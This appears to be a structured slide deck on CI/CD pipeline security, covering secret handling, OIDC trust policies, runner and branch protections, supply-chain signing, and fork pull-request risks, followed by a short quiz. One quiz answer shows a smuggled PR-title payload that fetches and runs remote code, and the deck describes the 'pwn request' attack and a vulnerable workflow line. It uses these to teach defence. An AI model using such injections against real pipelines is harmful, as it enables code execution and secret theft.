  "sections": [
    {
      "title": "Secrets and the Pipeline Threat Model",
      "role": "outline",
      "outlineIndex": 0,
      "pages": [
        {
          "title": "Secrets and the Pipeline Threat Model",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Threat model",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "A pipeline ==runs code== with ==credentials==",
                "Whoever can **change what it runs** can steal what it can reach"
              ],
              "style": "dot",
              "frame": "dashed",
              "ink": "red"
            },
            {
              "type": "heading",
              "text": "2. Where secrets live",
              "ink": "blue"
            },
            {
              "type": "bullets",
              "items": [
                "{blue:Secret store} (Vault, AWS Secrets Manager, GCP Secret Manager): central, with ==access policy==, ==audit log==, ==rotation==",
                "{purple:CI variable} (GitHub Actions secrets, GitLab masked variables): encrypted at rest, injected as an ==env var==",
                "Log masking hides only the **exact string**"
              ],
              "style": "dot"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Job starts",
                    "sub": "identity",
                    "ink": "blue"
                  },
                  {
                    "text": "Fetch",
                    "sub": "at runtime",
                    "ink": "purple"
                  },
                  {
                    "text": "Use",
                    "sub": "in memory",
                    "ink": "green"
                  }
                ]
              }
            },
            {
              "type": "table",
              "headers": [
                "",
                "CI variable",
                "Secret store"
              ],
              "rows": [
                [
                  "Control",
                  "copied per repo",
                  "**central**"
                ],
                [
                  "Rotation",
                  "none",
                  "{green:automatic}"
                ],
                [
                  "Audit",
                  "none",
                  "{green:full log}"
                ],
                [
                  "Lifetime",
                  "long-lived",
                  "short TTL, **dynamic**"
                ]
              ],
              "highlightRow": 1
            },
            {
              "type": "heading",
              "text": "3. Never leak",
              "ink": "orange"
            },
            {
              "type": "bullets",
              "items": [
                "`echo` a secret to the log",
                "Bake it into an ==image== or artifact",
                "Pass it in ==command-line args==",
                "Trust masking: ==base64== or split values bypass it"
              ],
              "style": "cross",
              "frame": "dashed",
              "ink": "orange"
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Masking is not protection",
              "text": "Masking matches the exact string only. A transformed value prints in **clear**."
            }
          ]
        }
      ]
    },
    {
      "title": "OIDC Federation Instead of Long-Lived Keys",
      "role": "outline",
      "outlineIndex": 1,
      "pages": [
        {
          "title": "OIDC Federation Instead of Long-Lived Keys",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Why OIDC",
              "ink": "green"
            },
            {
              "type": "bullets",
              "items": [
                "Static cloud keys in CI ==never expire==",
                "They leak through **logs** and **forks**",
                "Rotation is manual",
                "OIDC: {green:no stored key}, only short-lived credentials"
              ],
              "style": "dot"
            },
            {
              "type": "heading",
              "text": "2. Mechanism and Claims",
              "ink": "blue"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "CI job",
                    "sub": "signed JWT per job",
                    "ink": "blue"
                  },
                  {
                    "text": "Cloud verifies",
                    "sub": "provider public keys",
                    "ink": "purple"
                  },
                  {
                    "text": "Trust policy",
                    "sub": "matches claims",
                    "ink": "orange"
                  },
                  {
                    "text": "Temp creds",
                    "sub": "short-lived",
                    "ink": "green"
                  }
                ]
              }
            },
            {
              "type": "table",
              "headers": [
                "Claim",
                "Trust it for"
              ],
              "rows": [
                [
                  "`iss`",
                  "Which provider issued it"
                ],
                [
                  "`aud`",
                  "Intended audience (cloud)"
                ],
                [
                  "`sub`",
                  "Repo plus branch or environment"
                ],
                [
                  "`ref`, `workflow`",
                  "Branch and workflow file"
                ]
              ]
            },
            {
              "type": "heading",
              "text": "3. AWS Example",
              "ink": "purple"
            },
            {
              "type": "bullets",
              "items": [
                "IAM role trusts `token.actions.githubusercontent.com`",
                "Condition: `sub` = `repo:org/app:environment:prod`"
              ],
              "style": "dot"
            },
            {
              "type": "code",
              "lang": "yaml",
              "lines": [
                "permissions: {id-token: write}",
                "jobs:",
                "  deploy:",
                "    environment: prod",
                "    steps:",
                "      - uses: aws-actions/configure-aws-credentials@<commit-sha>",
                "        with:",
                "          role-to-assume: arn:aws:iam::123456789012:role/deploy"
              ],
              "note": "environment: prod makes sub match; pin by SHA, not a tag"
            },
            {
              "type": "heading",
              "text": "4. Mistake",
              "ink": "red"
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Loose trust policy",
              "text": "`repo:org/*` lets any repo and any branch in the org assume the role. No `sub` or `aud` check lets any repo on GitHub in. Pin repo plus branch or environment."
            }
          ]
        }
      ]
    },
    {
      "title": "Runners, Branches and Environments",
      "role": "outline",
      "outlineIndex": 2,
      "pages": [
        {
          "title": "Runners, Branches and Environments",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Token and runners",
              "ink": "blue"
            },
            {
              "type": "bullets",
              "items": [
                "Set ==permissions: contents: read== at the top of the workflow",
                "Grant write scopes only on the **one job** that needs them"
              ],
              "style": "check"
            },
            {
              "type": "code",
              "lang": "yaml",
              "lines": [
                "permissions:",
                "  contents: read",
                "jobs:",
                "  release:",
                "    permissions:",
                "      contents: write"
              ]
            },
            {
              "type": "table",
              "headers": [
                "",
                "Hosted",
                "Self-hosted"
              ],
              "rows": [
                [
                  "State",
                  "{green:Ephemeral}, clean per job",
                  "{red:Persists} between jobs"
                ],
                [
                  "Network",
                  "Outside yours",
                  "Inside your network"
                ],
                [
                  "Use for",
                  "Default",
                  "Trusted **private** repos, ephemeral or just-in-time"
                ]
              ]
            },
            {
              "type": "heading",
              "text": "2. Gates before prod",
              "ink": "green"
            },
            {
              "type": "bullets",
              "items": [
                "**Protected branch**: PR review, passing status checks, signed commits, no force pushes",
                "**Protected environment** (prod): required reviewers, branch restrictions",
                "Secrets are ==environment-scoped==, not repo-wide"
              ],
              "style": "dot"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Reviewed PR",
                    "sub": "checks pass",
                    "ink": "blue"
                  },
                  {
                    "text": "Deploy branch",
                    "sub": "allowed only",
                    "ink": "purple"
                  },
                  {
                    "text": "Approval",
                    "sub": "reviewers",
                    "ink": "orange"
                  },
                  {
                    "text": "Prod secrets",
                    "sub": "job gets them",
                    "ink": "green"
                  }
                ]
              }
            },
            {
              "type": "heading",
              "text": "3. Mistakes",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "One broad secret shared by all branches",
                "Admins bypassing branch protection"
              ],
              "style": "cross"
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Public repo",
              "text": "A self-hosted runner on a public repo means ==any fork PR runs code on your machine=="
            }
          ]
        }
      ]
    },
    {
      "title": "Supply-Chain Security: Pinning, SBOM and Sigstore",
      "role": "outline",
      "outlineIndex": 3,
      "pages": [
        {
          "title": "Supply-Chain Security: Pinning, SBOM and Sigstore",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Risks and Pinning",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "{red:Risks}: compromised dependency, ==typosquatting==, ==dependency confusion==",
                "Also: tampered action or image, poisoned build output"
              ],
              "style": "cross",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "Commit lockfiles with hashes: `npm ci`, `pip install --require-hashes`",
                "Pin actions to a full ==commit SHA==, images to a ==digest==",
                "Never a mutable tag: `@v3`, `:latest`"
              ],
              "style": "check",
              "ink": "red"
            },
            {
              "type": "heading",
              "text": "2. SBOM and Sigstore",
              "ink": "blue"
            },
            {
              "type": "bullets",
              "items": [
                "==SBOM== (SPDX or CycloneDX): machine-readable inventory of every component",
                "Keyless `cosign` signing uses an OIDC identity; signature goes to the ==Rekor== log"
              ],
              "style": "dot"
            },
            {
              "type": "code",
              "lang": "bash",
              "lines": [
                "syft app:1.0 -o spdx-json > sbom.json",
                "grype sbom:sbom.json",
                "cosign sign reg/app@sha256:abc",
                "cosign verify reg/app@sha256:abc \\",
                " --certificate-identity ID \\",
                " --certificate-oidc-issuer URL"
              ],
              "note": "syft lists, grype finds vulnerable versions, verify before deploy"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "Build",
                    "ink": "blue"
                  },
                  {
                    "text": "SBOM",
                    "sub": "syft",
                    "ink": "green"
                  },
                  {
                    "text": "Sign",
                    "sub": "cosign",
                    "ink": "purple"
                  },
                  {
                    "text": "Verify",
                    "sub": "before deploy",
                    "ink": "orange"
                  }
                ]
              }
            },
            {
              "type": "heading",
              "text": "3. Three Proofs",
              "ink": "green"
            },
            {
              "type": "table",
              "headers": [
                "",
                "Answers"
              ],
              "rows": [
                [
                  "SBOM",
                  "What is **inside**"
                ],
                [
                  "Signature",
                  "**Who** built it"
                ],
                [
                  "Provenance (SLSA)",
                  "**How** it was built"
                ]
              ],
              "highlightRow": 1
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Use all three",
              "text": "A signature proves ==origin==, not **safety**."
            }
          ]
        }
      ]
    },
    {
      "title": "Untrusted Pull Request Builds",
      "role": "outline",
      "outlineIndex": 4,
      "pages": [
        {
          "title": "Untrusted Pull Request Builds",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Fork PR Triggers",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "Fork PR code is ==untrusted==: it can edit the workflow, scripts and tests",
                "Running it with secrets = {red:remote code execution}"
              ],
              "style": "dot"
            },
            {
              "type": "table",
              "headers": [
                "",
                "`pull_request` (fork)",
                "`pull_request_target`"
              ],
              "rows": [
                [
                  "Context",
                  "PR code",
                  "Base repo"
                ],
                [
                  "Secrets",
                  "{green:None}",
                  "{red:Yes}"
                ],
                [
                  "Token",
                  "Read-only",
                  "Write"
                ]
              ],
              "highlightRow": 1
            },
            {
              "type": "bullets",
              "items": [
                "**Pwn request**: `pull_request_target` + `actions/checkout` of PR head + running its code",
                "Attacker gets your ==secrets== and ==write token=="
              ],
              "style": "cross",
              "ink": "red"
            },
            {
              "type": "heading",
              "text": "2. Safe Pattern",
              "ink": "green"
            },
            {
              "type": "diagram",
              "kind": "flow",
              "spec": {
                "nodes": [
                  {
                    "text": "pull_request",
                    "sub": "build and test, no secrets",
                    "ink": "red"
                  },
                  {
                    "text": "Artifact",
                    "sub": "results only",
                    "ink": "orange"
                  },
                  {
                    "text": "workflow_run",
                    "sub": "trusted: comment or deploy",
                    "ink": "green"
                  }
                ]
              }
            },
            {
              "type": "bullets",
              "items": [
                "Require ==maintainer approval== for first-time contributors"
              ],
              "style": "check"
            },
            {
              "type": "heading",
              "text": "3. Script Injection",
              "ink": "purple"
            },
            {
              "type": "code",
              "lang": "yaml",
              "lines": [
                "# bad: title pasted into the script",
                "run: echo \"${{ github.event.pull_request.title }}\"",
                "# good: pass via env, quote it",
                "env:",
                "  TITLE: ${{ github.event.pull_request.title }}",
                "run: echo \"$TITLE\""
              ],
              "note": "also applies to branch names"
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Untrusted fields",
              "text": "Never put PR titles or branch names directly in `run:`. Use ==env:== and a **quoted** variable."
            }
          ]
        }
      ]
    },
    {
      "title": "Pipeline Security Cheat Sheet",
      "role": "outline",
      "outlineIndex": 5,
      "pages": [
        {
          "title": "Pipeline Security Cheat Sheet",
          "blocks": [
            {
              "type": "heading",
              "text": "1. Secrets and OIDC",
              "ink": "green"
            },
            {
              "type": "bullets",
              "items": [
                "Keep secrets in a ==secret store==, scoped per environment",
                "Prefer **short-lived** or dynamic secrets",
                "Never print them; {red:rotate on leak}"
              ],
              "style": "check"
            },
            {
              "type": "bullets",
              "items": [
                "Job needs `permissions: id-token: write`",
                "Trust policy pinned to ==repo + branch or environment==",
                "Check `aud`; use {red:no static cloud keys}"
              ],
              "style": "check"
            },
            {
              "type": "heading",
              "text": "2. Hardening and Supply Chain",
              "ink": "blue"
            },
            {
              "type": "code",
              "lang": "yaml",
              "lines": [
                "permissions:",
                "  contents: read",
                "jobs:",
                "  deploy:",
                "    permissions:",
                "      id-token: write",
                "      contents: read"
              ],
              "note": "read-only by default, widen per job"
            },
            {
              "type": "bullets",
              "items": [
                "Ephemeral runners",
                "Protected branches: reviews, checks, ==no force push==",
                "Protected environments with reviewers"
              ],
              "style": "dot"
            },
            {
              "type": "table",
              "headers": [
                "Control",
                "Do"
              ],
              "rows": [
                [
                  "Dependencies",
                  "Lockfile with hashes"
                ],
                [
                  "Actions / images",
                  "Pin by **SHA** / digest"
                ],
                [
                  "Inventory",
                  "`syft` SBOM, `grype` scan"
                ],
                [
                  "Origin",
                  "`cosign` sign and verify"
                ]
              ]
            },
            {
              "type": "heading",
              "text": "3. Fork PRs",
              "ink": "red"
            },
            {
              "type": "bullets",
              "items": [
                "Use `pull_request` for forks",
                "Never run PR head code under `pull_request_target`",
                "Require approval for first-time contributors"
              ],
              "style": "cross"
            },
            {
              "type": "callout",
              "style": "sticky",
              "title": "Untrusted values",
              "text": "Pass titles and branch names via `env:`, never inline in `run:`."
            }
          ]
        }
      ]
    },
    {
      "title": "Check yourself",
      "role": "quiz",
      "pages": [
        {
          "title": "Check yourself",
          "blocks": [
            {
              "type": "qa",
              "q": "A role trust policy has `sub` = `repo:org/*`. Who can assume the role?",
              "a_bullets": [
                "Any repo and any branch in the org, not just the deploy job.",
                "Pin repo plus branch or environment, and check `aud`."
              ]
            },
            {
              "type": "qa",
              "q": "A `pull_request_target` workflow checks out the PR head and runs `npm test`. What goes wrong?",
              "a_bullets": [
                "The PR's edited tests run with your secrets and write token.",
                "Use a no-secret `pull_request` build, then a trusted `workflow_run` job."
              ]
            },
            {
              "type": "qa",
              "q": "A step has `run: echo \"${{ github.event.pull_request.title }}\"`. What is the bug?",
              "a_bullets": [
                "A title like `\"; curl evil | sh #` becomes shell code.",
                "Pass it via `env:` and quote the variable."
              ]
            }
          ]
        }
      ]
    }
  ]
}